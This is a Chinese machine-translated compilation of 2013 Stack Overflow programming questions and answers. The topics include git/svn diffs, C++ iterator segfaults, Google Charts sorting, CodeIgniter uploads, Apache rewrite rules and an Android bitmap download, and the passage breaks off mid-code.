如果你知道点 A 和点 B 以及长度 AC 和 BC，那么找到 C 就是做一个圆-圆相交的问题。有问题的两个圆是围绕 A 的半径为 AC 的圆和围绕 B 的半径为 BC 的圆。将有两个答案（如果您考虑一下这是有道理的：您始终可以选择将 C 放在 AB 的哪一侧，给定你所拥有的信息）。

# git - Git如何区分远程svn repo

> ID：15443920
> 
> 赞同：0
> 
> 时间：2013-03-15T23:53:31.440
> 
> 标签：git, svn

是否可以将本地 git 存储库与远程和外部 svn 存储库进行比较？

所以我有一个本地 git 存储库，我想看看它与位于外部并可通过 http 访问的第 3 方存储库之间的区别。

下载这个外部存储库是不收费的，因为我想将它包装在一个可以按需调用并快速确定任何差异的脚本中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T00:07:03.857

1.  从文件夹中的 svn repo 签出项目。
2.  将`.git`文件夹复制到 svn 工作副本中。
3.  `git diff`.

因此，您将在一个地方拥有两个系统的工作副本。

也许您需要添加`.svn`到 git 的忽略列表中。

# c++ - 删除 stl 集中的迭代器时出现分段错误

> ID：15443924
> 
> 赞同：-1
> 
> 时间：2013-03-15T23:53:46.667
> 
> 标签：c++, stl, iterator, segmentation-fault, set

我有一个程序，它遍历一个集合并替换一个元素，调用自身直到它无法继续，然后撤消它所做的并搜索下一个分支。

```
for(set<int>::iterator it=set1.begin();it!=set1.end();)
    {
        if(condition)
        {
            int l=*it;
            if(condition) set1.insert(l-rails[inuse]).first;
            set<int>::iterator it1=it;
            it++;
            set1.erase(it1);//this line has the problem
            //do other things, including a recursive call

            if(l>rails[inuse+1]+rails[inuse]) set1.erase(l-rails[inuse]);
            set1.insert(l);
        }
        else ++it;
    } 
```

我的程序似乎运行良好，并且在*我的*系统上正常运行，但它在另一个系统上因分段错误而崩溃。`valgrind`检测到分段违规：

```
==3610== Process terminating with default action of signal 11 (SIGSEGV)
==3610==  Access not within mapped region at address 0x18
==3610==    at 0x4EA8039: std::_Rb_tree_rebalance_for_erase(std::_Rb_tree_node_base*, std::_Rb_tree_node_base&) (in /usr/lib/libstdc++.so.6.0.17)
==3610==    by 0x402018: std::_Rb_tree<int, int, std::_Identity<int>, std::less<int>, std::allocator<int> >::_M_erase_aux(std::_Rb_tree_const_iterator<int>) (stl_tree.h:1497)
==3610==    by 0x401A4A: std::_Rb_tree<int, int, std::_Identity<int>, std::less<int>, std::allocator<int> >::erase(std::_Rb_tree_const_iterator<int>) (stl_tree.h:787)
==3610==    by 0x401586: std::set<int, std::less<int>, std::allocator<int> >::erase(std::_Rb_tree_const_iterator<int>) (stl_set.h:517)
==3610==    by 0x40104A: test() (fence8.cpp:32)
==3610==    by 0x40105E: test() (fence8.cpp:34)
==3610==    by 0x40105E: test() (fence8.cpp:34)
==3610==    by 0x40105E: test() (fence8.cpp:34)
==3610==    by 0x40105E: test() (fence8.cpp:34)
==3610==    by 0x40105E: test() (fence8.cpp:34)
==3610==    by 0x40105E: test() (fence8.cpp:34)
==3610==    by 0x40105E: test() (fence8.cpp:34) 
```

但我不明白是什么原因造成的。我认为这与我如何使用迭代器有关，但我找不到它。可能出了什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T00:30:37.193

请注意在迭代时更改集合 - 如果其中一个递归调用删除了迭代器`it`引用的元素，那么它将不再有效。考虑到每个递归调用从一开始就迭代整个集合，这是一种可能性。

# google-visualization - 在谷歌折线图中对 x 轴上的数据进行排序

> ID：15443931
> 
> 赞同：11
> 
> 时间：2013-03-15T23:54:17.737
> 
> 标签：google-visualization

我正在使用谷歌折线图按时间戳（x 轴）绘制数据。

我的问题是谷歌图表没有自动对 x 轴进行排序。

例如，应该是图表中第一个的“15:45:23 678”数据点显示在#2。如果我把它放在第一位，那很好。这意味着谷歌图表并不关心数据，它会根据看到的数据进行绘图。

问题是我的数据集很大，根据 x 轴数据对其进行排序需要很多时间。折线图中是否有任何标志可以在浏览器中对其进行排序？

以下是样本数据：

```
['x', 'c1', 'c2', 'c3', 'c4', 'c5', 'c6'],

['15:48:13 744', 0, 0, 0, 0, 0, 0], 

['15:45:23 678', 5, 17, 36, 3957, 20, 21], 

['15:48:18 749', 0, 0, 0, 0, 0, 0] 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-16T14:01:04.870

您可以使用以下函数对基础 DataTable 进行排序：
`data.sort([{column: 0}]);`。第 0 列表示 x 轴。
这将按 asc 顺序对数据进行排序，供 desc 使用`data.sort([{column: 0, desc: true}]);`

您可能还对该`getSortedRows(sortColumns)`功能感兴趣。

有关这些函数的更多信息，请参阅此处
[https://developers.google.com/chart/interactive/docs/reference#DataTable_sort](https://developers.google.com/chart/interactive/docs/reference#DataTable_sort)
[https://developers.google.com/chart/interactive/docs/reference#DataTable_getSortedRows](https://developers.google.com/chart/interactive/docs/reference#DataTable_getSortedRows)

# ajax - 使用 Codeigniter 和 jQuery 表单插件上传 Ajax 文件

> ID：15443937
> 
> 赞同：2
> 
> 时间：2013-03-15T23:55:00.290
> 
> 标签：ajax, codeigniter, file-upload

我想使用带有 Codeigniter 的 jQuery 表单插件。当我尝试上传时，页面被重定向（因此 ajax 不起作用）并且没有上传任何内容。

表单所在的视图如下所示：

```
<form id="upload_form" action="upload/do_upload" method="post" enctype="multipart/form-data">
   <input type="file" name="myfile"><br>
   <input type="submit" value="Upload File to Server">
</form>

<div class="progress">
        <div class="bar"></div >
        <div class="percent">0%</div >
</div>
<div id="status"></div>

<script>
(function() {

var bar = $('.bar');
var percent = $('.percent');
var status = $('#status');

$('#upload_form').ajaxForm({
    beforeSend: function() {
        status.empty();
        var percentVal = '0%';
        bar.width(percentVal)
        percent.html(percentVal);
    },
    uploadProgress: function(event, position, total, percentComplete) {
        var percentVal = percentComplete + '%';
        bar.width(percentVal)
        percent.html(percentVal);
    },
  complete: function(xhr) {
    status.html(xhr.responseText);
  }
}); 

})();   
</script>    
<script type="text/javascript" src="http://localhost/editor/assets/js/jquery-1.7.2.min.js"></script>
<script type="text/javascript" src="http://localhost/editor/assets/js/jquery.form.js"></script>
</body> 
```

上传的控制器取自 Codeigniter 手册：

```
<?php

class Upload extends CI_Controller {

    function __construct()
    {
        parent::__construct();
        $this->load->helper(array('form', 'url'));
    }

    function do_upload()
    {
        $config['upload_path'] = './userdata/';
        $config['allowed_types'] = 'gif|jpg|png';
        $config['max_size'] = '100';
        $config['max_width']  = '1024';
        $config['max_height']  = '768';

        $this->load->library('upload', $config);

        if ( ! $this->upload->do_upload())
        {
            $error = array('error' => $this->upload->display_errors());

            //$this->load->view('upload_form', $error);   TODO echo error 
        }
        else
        {
            $data = array('upload_data' => $this->upload->data());

            //$this->load->view('upload_success', $data);  TODO echo succes
        }
    }
}
?> 
```

我确定我只是在某个地方犯了一个小错误，有人能看到我哪里出错了吗？提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-17T04:47:25.147

当 DOM 准备好时，您似乎忘记了初始化表单。

```
$(document).ready(function() { 
        // bind 'myForm' and provide a simple callback function 
        $('#upload_form').ajaxForm(function() { 
            //rest of your code from the post
        }); 
    }); 
```

# java - 将文件类型与 Java Swing 应用程序相关联

> ID：15443939
> 
> 赞同：7
> 
> 时间：2013-03-15T23:55:09.203
> 
> 标签：java, swing, file, file-extension, file-association

我正在创建一个 java swing 应用程序，我需要将我的程序设置为文件扩展名`.mcsd`（MIME 类型`text/mcsd`）的默认程序。这*必须*在 Windows 上工作，如果它也能在 OS X/Linux 上工作，那就太好了。我对java有些陌生（3或4个月）所以请不要用各种专家谈话轰炸我。

我已经看到[将自定义文件扩展名与 windows 中的 java 应用程序相关联](https://stackoverflow.com/questions/9556476/associating-a-custom-file-extension-with-java-app-in-windows)，但我不想使用 Java Web Start。如果可能的话，我也想知道如何设置该文件类型的图标。我发现[exe4j](http://www.ej-technologies.com/products/exe4j/overview.html)是一种创建`.exe`并计划使用它的方式，但如果不是将转换为 exe 的最佳工具，或者有人知道更好的东西，请随时告诉我。另一件事：程序打开后，我需要能够从该文件中获取数据。

所以我的问题是：***我该怎么做？***

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-16T01:19:57.570

部署应用程序。使用[Java Web 启动](https://stackoverflow.com/tags/java-web-start/info)：

> JWS 提供了许多吸引人的功能，包括但不限于启动屏幕、桌面集成、**文件关联、**自动更新......

请参阅[文件服务演示。](http://pscode.org/jws/api.html#fs)有关声明对`.zzz`文件类型感兴趣的 JNLP 示例。

这是在 JNLP 中声明关联的方式：

```
<association
  extensions="zzz"
  mime-type="text/sleepytime" /> 
```

JWS 由 Oracle 提供，适用于 Windows、*nix 和 OS X。

> ..但我宁愿不使用 Java Web Start。因为我想要一个本机安装程序，它只安装程序，而不打开网页或任何东西。如果这不是（网络启动）的工作方式，那么我很乐意使用它。

JWS 通过 Web 或网络工作。但是，如果您可以从桌面调用打开 URL（到 JNLP），则不需要打开任何浏览器。

> 我会`openConnection()`在 URL 对象上使用吗？

我会使用[`Desktop`](http://docs.oracle.com/javase/7/docs/api/java/awt/Desktop.html)or [`BasicService`](http://docs.oracle.com/javase/7/docs/jre/api/javaws/jnlp/javax/jnlp/BasicService.html)API。

```
Desktop.getDesktop().browse(uri);

boolean result = basicService.showDocument(url); 
```

如[`BasicService`演示](http://pscode.org/jws/api.html#bs)中所述。

> 在 Java 6+ 中，显示另一个 web 启动文件的调用（例如`BasicService.showDocument(another.jnlp))`，将直接交给 JavaWS，不会出现浏览器窗口。

我希望 API 始终如此`Desktop`，因为 JWS 客户端是该文件类型的默认使用者。

# servlets - 将 Web 表单连接到 servlet

> ID：15443940
> 
> 赞同：-1
> 
> 时间：2013-03-15T23:55:10.190
> 
> 标签：servlets

截至目前，我收到错误消息类 not fount yadiyadiyada，如下图所示。我在服务器的 web.xml 中，底部是映射。在解决方案资源管理器中，servlet 是 login.java。（我假设 url 模式和 servlet 名称是正确的......他们没有给出错误）

我现在知道我的 servlet 的正确路径。谢谢，但这显然不是问题。任何机构都知道什么可能导致此错误？

![在此处输入图像描述](../Images/4afa81c0155186d78b2da36bef769ded.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-16T00:46:24.783

您的问题不是 servlet 路径。错误是`ClassNotFoundException`。在`<servlet-class>`标签中，您放置`RoboMonkey.JavaResources.src.servlets.login`. 这不是您的 servlet 的正确类全名。请`servlets.login`改为。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-16T02:26:13.527

我通过在我的项目 WEB-INF 文件夹中创建自己的 web.xml 文件解决了这个问题，然后将表单操作设为“login”、url 模式“login”和 servlet 名称“login”。

编辑我还正确设置了 servlets.java 的路径

# java - JTabbedPane 自动调整大小

> ID：15443946
> 
> 赞同：1
> 
> 时间：2013-03-15T23:55:52.280
> 
> 标签：java, swing, netbeans, jframe, jtabbedpane

我正在使用 Net-Beans 开发 Java Swing 应用程序。该应用程序有一个`JFrame`带有选项卡的窗格。现在的问题是，当框架最大化时，选项卡式窗格仅覆盖页面的一半，并且不会重新调整大小以适应框架的新大小。

Net-Beans 中是否有一种方法可以使选项卡式窗格随`JFrame`.

如果必须以编程方式完成，我将如何处理？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-16T01:22:37.327

听起来像布局管理器问题

`BorderLayout`在添加之前尝试将框架的布局设置为`JTabbedPane`

# php - 通过 php 在 JSON 对象中提取 JSON 对象

> ID：15443948
> 
> 赞同：1
> 
> 时间：2013-03-15T23:56:39.410
> 
> 标签：php, json

我有 JSON 数据，如图所示：

```
{
    "15": {
        "nid": "15",
        "status": "1",
        "created": "1352652530",
        "changed": "1353780901",
        "title": "some data",
        "type": "some data",
        "tracking_url": {
            "10": {
                "affiliate": "OMG",
                "url_part1": "some data"
            }
        },
        "primary_category": "Travel",
        "active_affiliate": "OMG"
    },
    "16": {
        "nid": "16",
        "status": "1",
        "created": "1352652530",
        "changed": "1353780901",
        "title": "some data",
        "type": "some data",
        "tracking_url": {
            "11": {
                "affiliate": "OMG",
                "url_part1": "some data"
            }
        },
        "primary_category": "Travel",
        "active_affiliate": "OMG"
    }
} 
```

我可以使用以下方法成功解码 JSON：

```
$response = json_decode($p, true); 
```

现在我必须从（在**tracking_url**中提取元素）中提取**url_part1**和**附属**值，这是我无法做到的。`$response`

 *** * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T00:12:15.410

假设 JSON 结构`$p`实际上如下所示：

```
"16": {
    "nid":"16",

    "tracking_url": {
        "10": {
            "affiliate":"OMG",
            "url_part1":"some data"
        }
    }

}, 
```

您可以通过以下方式访问 url_part1 和附属机构

```
$response = json_decode($p, true);

$urlPart = array();
$affiliate = array();

foreach ($response as $nid => $data) {
    $urlPart[$nid]   = $data['tracking_url']['10']['url_part1'];
    $affiliate[$nid] = $data['tracking_url']['10']['affiliate'];
} 
```

这只是如何访问数据的示例，您可以根据需要写入任何需要的变量。**

# postgresql-9.2 - Rails 4 UUID 作为具有默认值的 ID

> ID：15443951
> 
> 赞同：3
> 
> 时间：2013-03-15T23:57:11.483
> 
> 标签：postgresql-9.2, ruby-on-rails-4

使用 Rails 4 和 PostgreSQL，是否可以在不直接使用 SQL 的情况下创建主键为 UUID 的表？现在，我求助于：

```
c = ActiveRecord::Base.connection                                                                                                   
c.execute 'CREATE TABLE revisions (id uuid primary key default uuid_generate_v4());' 
```

我知道这不是可移植的并且具有性能影响。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-03T16:58:29.530

我知道这是一个较老的问题，但是现在 Rails 4 对使用 UUID 作为主要 id 的支持稍微好一点。有关更多信息，请参阅[此帖子](http://labria.github.io/2013/04/28/rails-4-postgres-uuid-pk-guide/)。

# vb.net - 条件单元测试

> ID：15443954
> 
> 赞同：0
> 
> 时间：2013-03-15T23:57:28.033
> 
> 标签：vb.net, unit-testing, mstest

这似乎是一个敏感的话题，所以我可能会对此感到非常讨厌，但这里什么都没有：

我正在开发的应用程序严重依赖外部 API，而该 API 需要个性化的开发人员密钥才能执行任何操作。这使得像我这样的单元测试新手特别难以编写可以重新分发的测试，而不必一直担心我的开发人员密钥可能会被泄露。

我的观点是：如果未提供开发人员密钥，我想阻止我的单元测试运行。还应该清楚的是，当这种情况发生时，它不是应用程序错误，而是用户错误。

这是我可以使用 MSTest 框架轻松完成的事情吗？

**到目前为止我尝试过的**（VB）

现在，如果未设置开发人员密钥，我只是让我的测试失败：

```
<TestClass()> Public Class Tests

    Private Shared DeveloperKey As NMAKey

    <ClassInitialize>
    Public Shared Sub Initialize(context As TestContext)
        DeveloperKey = NMAKey.TryParse("Your developer key")
    End Sub

    <TestMethod>
    Public Sub Example()
        ' test condition
        Assert.IsNotNull(DeveloperKey)

        '
        ' actual test code that relies on 'DeveloperKey' being set
        '
    End Sub

End Class 
```

我的问题是用户错误和实际单元故障之间没有区别。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T11:00:37.340

您可能应该将开发人员密钥放在配置文件中，并在版本控制中忽略该文件。您可以检查是否在测试类的初始化而不是单个测试中找到了密钥。另一种可能性是编写测试来检查配置文件中是否存在密钥。我真的不明白为什么你认为区分用户错误和应用程序错误很重要，坏了就是坏了:)

# php - 复选框的 bind_param 字符类型

> ID：15443959
> 
> 赞同：0
> 
> 时间：2013-03-15T23:57:50.783
> 
> 标签：php, checkbox, prepared-statement

只是想知道何时使用 mysqli_stmt_bind_param 作为复选框值。字符类型会是整数“i”吗？- 当复选框发送 1 或 0 时。仅要求确认。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T06:59:29.047

1.  数据源与这些问题无关，无论是复选框、csv 文件还是硬编码值。只有目的地很重要。
2.  所以，它的*数据库字段类型*只需要你关心。
3.  然而，在大多数情况下，mysql 可以愉快地接受所有值的*字符串*，因此，您可以不必为所有这些绑定而烦恼，而是一直使用 s。

# maven - 如何使用 maven 配置 jasperreports 5？

> ID：15443965
> 
> 赞同：0
> 
> 时间：2013-03-15T23:58:54.457
> 
> 标签：maven, jasper-reports, ireport

我安装了 iReport-5.0.1。我想用 Maven 配置 JasperReports。我的 POM 文件如下所示：

 `````
<dependency>

    <groupId>org.codehaus.groovy</groupId>
    <artifactId>groovy</artifactId>
    <version>2.1.1</version>

</dependency>

<dependency>

    <groupId>com.itextpdf</groupId>
    <artifactId>itextpdf</artifactId>
    <version>5.4.0</version>

</dependency>

<dependency>

    <groupId>net.sf.jasperreports</groupId>
    <artifactId>jasperreports</artifactId>
    <version>5.0.1</version>

</dependency>

<dependency>

    <groupId>poi</groupId>
    <artifactId>poi</artifactId>
    <version>3.1-FINAL</version>

</dependency> 
```` 

`我想我的设置是错误的。有人可以帮我吗？`

 `* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-18T13:16:34.337

解决了：

---------- pom.xml ----------

 `````
<project [ default xml namespace details.. ]>

    [..project-details..]
    <dependencies>

        <dependency>

            <groupId>net.sf.jasperreports</groupId>
            <artifactId>jasperreports</artifactId>
            <version>5.0.1</version>

        </dependency>

        <dependency>

            <groupId>commons-beanutils</groupId>
            <artifactId>commons-beanutils-core</artifactId>
            <version>1.8.3</version>

        </dependency>

        <dependency>

            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>

        </dependency>

        <dependency>
            <groupId>commons-logging</groupId>
            <artifactId>commons-logging</artifactId>
            <version>1.1.1</version>
        </dependency>

        <dependency>

            <groupId>org.apache.commons</groupId>
            <artifactId>commons-digester3</artifactId>
            <version>3.2</version>

        </dependency>
        <dependency>

            <groupId>org.eclipse.jdt.core.compiler</groupId>
            <artifactId>ecj</artifactId>
            <version>4.2.1</version>

        </dependency>

        <dependency>

            <groupId>org.codehaus.groovy</groupId>
            <artifactId>groovy-all</artifactId>
            <version>2.1.1</version>

        </dependency>

        <dependency>

            <groupId>org.mozilla</groupId>
            <artifactId>rhino</artifactId>
            <version>1.7R4</version>

        </dependency>

        <dependency>

            <groupId>org.beanshell</groupId>
            <artifactId>bsh</artifactId>
            <version>2.0b5</version>

        </dependency>

        <dependency>

            <groupId>com.google.code.maven-play-plugin.org.apache.commons</groupId>
            <artifactId>commons-javaflow</artifactId>
            <version>1209105</version>

        </dependency>

        <dependency>

            <groupId>org.jfree</groupId>
            <artifactId>jfreechart</artifactId>
            <version>1.0.14</version>

        </dependency>

        <dependency>

            <groupId>org.jfree</groupId>
            <artifactId>jcommon</artifactId>
            <version>1.0.17</version>

        </dependency>

        <dependency>

            <groupId>com.itextpdf</groupId>
            <artifactId>itextpdf</artifactId>
            <version>5.4.0</version>

        </dependency>

        <dependency>

            <groupId>com.itextpdf.tool</groupId>
            <artifactId>xmlworker</artifactId>
            <version>1.2.1</version>

        </dependency>

        <dependency>

            <groupId>org.apache.poi</groupId>
            <artifactId>poi</artifactId>
            <version>3.9</version>

        </dependency>

        <dependency>

            <groupId>net.sourceforge.jexcelapi</groupId>
            <artifactId>jxl</artifactId>
            <version>2.6.12</version>

        </dependency>

        [..other package dependency..]
    </dependencies>

</project> 
```````

# jquery - 如何在 HTML 中使用 Dropkick 默认选择？

> ID：15443969
> 
> 赞同：0
> 
> 时间：2013-03-15T23:59:19.103
> 
> 标签：jquery, jquery-dropkick

我想在下拉列表中预先选择某个选项，并希望使用 HTML 中的“selected”参数来选择它。这可能吗？

```
 <option value="@cat.ID" 
                            @if(cat.ID == 2){
                                @: selected );
                            }
                        >@cat.Category</option> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-05-09T10:50:33.687

要选择默认选项，您可以执行以下操作：

```
var elm = new Dropkick("#select");

// Select by index
elm.select(4); //selects & returns 5th item in the list

// Select by value
elm.select("AL"); // selects & returns option with the value "AL" 
```

参考文档：[http ://dropkickjs.com/api.html#method-select](http://dropkickjs.com/api.html#method-select)

# ruby-on-rails-3.2 - 基于 has_many 关系中最后一个对象的属性的默认排序顺序

> ID：15443973
> 
> 赞同：0
> 
> 时间：2013-03-16T00:00:23.513
> 
> 标签：ruby-on-rails-3.2

我有一个看起来像这样的公司模型

```
class Company < ActiveRecord::Base
  has_many :values
end 
```

然后价值模型看起来像这样

```
class Value < ActiveRecord::Base
  belongs_to :company
  default_scope order: 'created_at ASC'
end 
```

我想为公司创建一个默认排序顺序，以便根据最新值对它们进行排序。拥有最新价值观的公司应该是第一位的。像这样的东西：

```
default_scope order: 'companies.values.last.created_at DESC' 
```

但是当我把它放在我的公司模型中时，我得到了这个错误：

```
SQLite3::SQLException: near "values": syntax error: SELECT  "companies".* FROM "companies"  WHERE "companies"."id" = ? ORDER BY companies.values.last.calculated_at DESC LIMIT 1 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-27T20:08:09.943

在 belongs_to :company 关联中包含 touch: true 。每当添加值时，这将更新关联公司的 updated_at 列。现在您可以对 updated_at 列进行排序。

```
class Value < ActiveRecord::Base
  belongs_to :company, touch: true
end

class Company < ActiveRecord::Base
 has_many :values
 default_scope order: 'updated_at DESC'
end 
```

# python - Python中的评级控制

> ID：15443974
> 
> 赞同：1
> 
> 时间：2013-03-16T00:00:26.990
> 
> 标签：python, user-interface, wxpython

有谁知道 wxPython / Python 中评级控制的有用实现？

我想要一个功能，用户可以将特定文档评为相关或不相关，我想在基于星级的评级系统中捕捉到这一点。

因为，我已经在 wxPython 中完成了其他 GUI 开发，如果有人指出如何在 Python 中完成这将非常有帮助。

我

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T22:51:01.297

根据对“有用”的解释，标准库中肯定有解决方案。他们将为您提供一个可用的解决方案，但不会提供令人眼花缭乱的效果或特别好的用户体验。

*   有[**`wx.Slider`**](http://wxpython.org/docs/api/wx.Slider-class.html)（[示例](http://wxpython.org/docs/api/wx.Slider-class.html)），可以很容易地使用。对于给定的比例，用户可以通过将滑块拖动到数字比例的上限或下限来给出评分。

*   另一种解决方案是[**`wx.RadioButton`**](http://wxpython.org/docs/api/wx.RadioButton-class.html)（[示例](http://zetcode.com/wxpython/widgets/#radiobutton)）表示一组选项，一次只能选择一个选项。这是标记选项的可用实现——例如，为文档选择差、中或好评级。

如果您不喜欢上面给出的选项，您可能最终会实现自己的控件。起初这可能有点挑战，但可以让您获得在 Web 应用程序中经常看到的星级。您可能想前往[wxPython custom control](https://stackoverflow.com/questions/2377135/wxpython-custom-control) SO question。快速搜索并没有为我提供任何现有的实现。

# c# - 如何获取 ListView 项目 ID

> ID：15443976
> 
> 赞同：0
> 
> 时间：2013-03-16T00:00:55.540
> 
> 标签：c#, windows-runtime, winrt-xaml

我有这个带有 TextBock 和 CheckBox 的 ListView：

```
<ListView x:Name="ActiveTasksListView" ItemsSource="{Binding Path=ActiveTasks}" SelectedItem="{Binding Id}">

<ListView.ItemsPanel>
    <ItemsPanelTemplate>
        <StackPanel Orientation="Vertical" Margin="37,0,17,0" />
    </ItemsPanelTemplate>
</ListView.ItemsPanel>

<ListView.ItemTemplate>
    <DataTemplate>
        <Border Background="White">
            <TextBlock Text="{Binding Name}" />
            <CheckBox Click="CheckBox_Click_1" />
        </Border>
    </DataTemplate>
</ListView.ItemTemplate>

</ListView> 
```

如果我单击 CheckBox，则需要在 MessageDialog() 中显示单击项目的 Id（来自数据源）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T00:14:31.427

使用 VisualTreeHelper 并单击 CheckBox 元素，您可以找到 ListViewItem 然后获取其 Id 属性

```
void CheckBox_Click_1(object sender, RoutedEventArgs e)
{
    var item = sender as DependencyObject;

    while (!(item is ListViewItem))
    {
        item = VisualTreeHelper.GetParent(item);
    }

    var id = ((ObjectClass) item).Id;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-16T03:47:30.517

```
void CheckBox_Click_1(object sender, RoutedEventArgs e)
{
    var cb = sender as CheckBox;
    dynamic itemVM = cb.DataContext;
    var id = itemVM.Id;
} 
```

# php - 仅针对一个文件的 RewriteRule

> ID：15443977
> 
> 赞同：2
> 
> 时间：2013-03-16T00:01:15.563
> 
> 标签：php, apache, .htaccess, mod-rewrite

基本上我有下面的htaccess。目前它运行良好，但它会重定向每个文件。例如，当我只想将 about.php 重定向到 /about 时，将 foo.php 重定向到 /foo。基本上我想强制删除 about.php 的 .php 扩展名，但只删除那个文件。

```
RewriteRule ^about$ about.php [L]
RewriteCond %{REQUEST_URI} ^/about.php$ [NC]
RewriteRule .* /about [R,L] 
```

现在我有了上面的代码。它现在会导致过多的重定向错误。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-16T00:16:10.113

```
RewriteRule ^about$ about.php [L] 
```

那是您正确的*重写*，这意味着`/about`将处理对的请求，就好像它是对的请求一样`/about.php`：

至于这个单独的问题：

> 我不希望用户看到 about.php，即使他输入

您将需要从to*重定向*。这就是您的第二行和第三行所做的（带有重定向标志的 RewriteRule），但条件是广泛的，并且还包含一些超流的东西：`/about.php``/about``[R]`

```
RewriteCond %{THE_REQUEST} ^[A-Z]{3,}\s([^.]+)\.php [NC]
RewriteRule ^ %1 [R,L,NC] 
```

将其更改为：

```
RewriteCond %{REQUEST_URI} ^/about.php$ [NC]
RewriteRule .* /about [R,L] 
```

> 这会保留 GET 参数吗？

如果添加`[QSA]`标志（查询字符串追加），是的。

**更新**

正如@PeterWooster 指出的那样，重定向部分可以简化为：

```
Redirect /about.php /about 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-16T11:48:43.273

我自己修好了。

```
RewriteCond %{THE_REQUEST} about.php
RewriteRule (.*)\.php$ /$1 [L,R]
RewriteRule ^about$ about.php [L] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-16T00:04:32.250

您可以使用重定向规则来做到这一点，这真的很简单。[http://httpd.apache.org/docs/2.2/mod/mod_alias.html](http://httpd.apache.org/docs/2.2/mod/mod_alias.html)

编辑：这会导致服务器向客户端发送重定向，如果使用 301 状态，这对于移动网站时的 SEO 特别有用。

来自 apache 文档的示例：

重定向 /service [http://foo2.example.com/service](http://foo2.example.com/service)

# c# - File.GetFiles 或 File.EnumerateFiles 锁定文件？

> ID：15443985
> 
> 赞同：4
> 
> 时间：2013-03-16T00:02:27.330
> 
> 标签：c#, file

此代码有效：

```
File.Copy(file, Path.Combine(destinationFolder, file), true); 
```

这不起作用：

```
foreach (string file in Directory.GetFiles(sourceFolder))
{
    File.Copy(file, Path.Combine(destinationFolder, file), true);
} 
```

它在第一个文件中给出了一个例外：

> 该进程无法访问文件“C:\Users\Ricardo\Desktop\Palomas\IMG_20130215_134854.jpg”，因为它正被另一个进程使用。

为什么？看起来像 Directory.GetFiles 或 Directory.EnumerateFiles 锁定文件

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-16T00:17:04.340

foreach 中的一个简单错误。

我试图在同一个地方复制和粘贴。

以这种方式修复：

```
 foreach (string file in Directory.EnumerateFiles(sourceFolder))
    {
        File.Copy(file, Path.Combine(destinationFolder, Path.GetFileName(file)), true);
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-07-29T16:59:16.810

有同样的问题 - 在文件夹上执行 Directory.GetFiles，然后将每个文件路径/名称传递给 SQL Server 的调用以批量加载文件，并且文件被另一个进程错误锁定。看起来 Directory.GetFiles 会暂时锁定文件-释放锁定的速度取决于文件夹所在计算机上操作系统的速度。我认为释放锁可能会落后一点。在我的应用程序中，我在 Directory.GetFiles 语句之后和其他任何内容之前放置了 30 秒的暂停 {Thread.Sleep(30000)} - 这解决了我的问题。

# highcharts - Highcharts、highslide 和 ReportViewer

> ID：15443986
> 
> 赞同：1
> 
> 时间：2013-03-16T00:02:34.963
> 
> 标签：highcharts, highslide

我在我的系列中使用柱形图（Highcharts），点击事件，我有这个：

```
var name = this.category;
var url='../Graphics/VtnPopup.aspx?cat='+name;
$.get(url, function (data) { 
hs.htmlExpand(null, { 
pageOrigin: { 
x: 50, 
y: 50 
}, 
headingText: name, 
maincontentText: data 
}); 
```

但是在 VtnPopup 我有一个reportViewer，所以当highslide 打开时我看不到报告，我认为它可能是“maincontentText”的类型，你知道做这样的事情吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T09:47:10.437

`maincontent`如果要在弹出窗口中打开特定 url，则不能使用 Highslide方法。您必须将 Highslide iframe 弹出窗口 -`objectType: 'iframe'`与`src`变量结合使用。
在`plotOptions`：

```
series: {
    cursor: 'pointer',
    point: {
        events: {
            click: function () {
                var name = this.category;
                var url = '../Graphics/VtnPopup.aspx?cat=' + name;
                hs.htmlExpand(null, {
                    pageOrigin: {
                        x: 50, // this.pageX, will open the popup on top of each column
                        y: 50 // this.pageY will open the popup on top of each column
                    },
                    objectType: 'iframe',
                    src: url,
                    headingText: name
                });
            }
        }
    }
} 
```

# android - Android - 来自 URL 的位图添加到 rootview

> ID：15443989
> 
> 赞同：0
> 
> 时间：2013-03-16T00:03:07.790
> 
> 标签：android

我在从 url 中提取位图时遇到了一些麻烦。我在 Stack 上使用了另一个问题的示例，但它不会加载图像。这是代码：

```
public class Image extends Activity{
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    Bitmap bitmap = DownloadImage("http://cogadget.com/cogadget/wp-content/uploads/2010/05/Android-Logo-50x50.jpg");
    ImageView img = (ImageView) findViewById(R.id.imageView1);
    img.setImageBitmap(bitmap);
}

private InputStream OpenHttpConnection(String urlString) throws IOException {
    InputStream in = null;
    int response = -1;

    URL url = new URL(urlString);
    URLConnection conn = url.openConnection();

    if (!(conn instanceof HttpURLConnection))
        throw new IOException("Not an HTTP connection");

    try {
        HttpURLConnection httpConn = (HttpURLConnection) conn;
        httpConn.setAllowUserInteraction(false);
        httpConn.setInstanceFollowRedirects(true);
        httpConn.setRequestMethod("GET");
